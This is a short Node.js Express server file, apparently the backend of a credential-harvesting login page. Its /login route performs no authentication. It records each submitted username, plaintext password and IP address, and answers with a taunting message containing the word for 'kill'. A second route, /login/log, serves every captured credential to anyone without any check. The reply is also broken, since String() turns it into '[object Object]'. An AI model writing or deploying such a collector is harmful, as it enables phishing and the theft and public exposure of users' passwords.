const express = require("express");
const path = require("path");

const app = express();
const loginLog = [];
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// HTML配信
app.use(express.static(__dirname));


// ログイエンドポイント
app.post("/login", (req, res) => {

  loginLog.push({user:req.body.user,password:req.body.password,ip:req.socket.remoteAddress});
  res.send(String({login:"成功だろ。ころすy"}));

});
app.get("/login/log",(q,r)=>{
  r.json(loginLog);
})

app.listen(process.env.PORT || 3000, () => {
  console.log("Server running");
});
